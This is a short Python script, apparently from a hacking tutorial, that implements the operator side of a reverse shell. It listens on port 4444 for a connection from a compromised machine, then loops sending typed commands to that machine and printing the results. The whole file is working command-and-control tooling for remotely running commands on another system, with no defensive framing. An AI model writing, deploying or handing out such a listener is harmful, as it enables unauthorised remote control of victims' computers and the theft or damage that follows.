#!/usr/bin/env python

import socket


class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))  # Your ıp address and port which is you want to use
        listener.listen(0)
        print("[+] Waiting for incoming connections")
        self.connection, address = listener.accept()
        print("[+] Got a connection from" + str(address))


    def execute_remotely(self,command):
        self.connection.send(command)
        return self.connection.recv(1024)

    def run(self):
        while True:
            command = input(">> ")
            result = self.execute_remotely(command)
            print(result)

my_listener = Listener("YOUR IP ADDRESS", 4444)
my_listener.run()